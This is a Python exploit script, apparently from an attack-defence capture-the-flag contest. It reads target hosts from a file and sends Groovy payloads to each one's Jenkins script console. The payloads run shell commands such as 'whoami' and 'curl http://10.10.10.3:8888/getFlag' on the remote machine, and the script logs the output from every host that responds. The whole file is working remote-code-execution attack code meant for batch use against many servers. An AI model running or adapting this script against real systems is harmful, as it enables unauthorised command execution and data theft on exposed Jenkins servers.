#coding:u8
import re
import requests
import logging
import urllib
from bs4 import BeautifulSoup

filename=r'targets.txt'
cmd1={'script':'println "whoami".execute().text','json':'{"script": "println \"whoami\".execute().text", "": "println \"whoami\".execute().text"}','Submit':'Run'}
cmd2={'script':'println "curl http://10.10.10.3:8888/getFlag".execute().text','json':'{"script": "println \"curl http://10.10.10.3:8888/getFlag\".execute().text", "": ""}','Submit':'Run'}
cmd3={'script':'println "curl http://127.0.0.1/getFlag".execute().text','json':'{"script": "println \"curl http://127.0.0.1/getFlag\".execute().text", "": ""}','Submit':'Run'}

if __name__=='__main__':
    targets=[]
    l=logging.INFO
    #l=logging.DEBUG
    log_format='%(asctime)s %(message)s'
    logging.basicConfig(level=l,format=log_format,datefmt='%a, %d %b %Y %H:%M:%S',filename='log.log',filemode='a')
    console=logging.StreamHandler()
    console.setLevel(l)
    formatter = logging.Formatter(log_format)
    console.setFormatter(formatter)
    logging.getLogger('').addHandler(console)
    logging.info('------------------------------------Starting working-----------------------------------------')
    for line in open(filename,'rt').readlines():
        targets.append(line.strip())
    logging.debug('Get target:'+str(len(targets)))
    try:
        for target in targets:
            logging.debug("Requesting target [ "+target+" ]!")
            res=requests.post(url=r'http://'+target+':8081/jenkins/script',data=cmd2)
            logging.debug("Response code from [ "+target+" ] is: "+str(res.status_code))
            if res.status_code == 200:
                soup=BeautifulSoup(res.content,'lxml')
                l=soup.find_all('pre')
                result=l[-1].string
                #print result
                logging.info("From [ "+target+" ]: "+result)
                #s=re.findall(string=res.content,pattern='<h\d>Result</h\d><pre>',)
                #s=re.findall(string=res.content,pattern='<h\d>Result</h\d><pre>.*</pre>',)
                #print res.content
                #print res.text
            else:
                logging.info("[ "+target+" ] maybe fixed! Manually check!!")
    except:
        pass
    logging.info("Work is done! BYE!!")
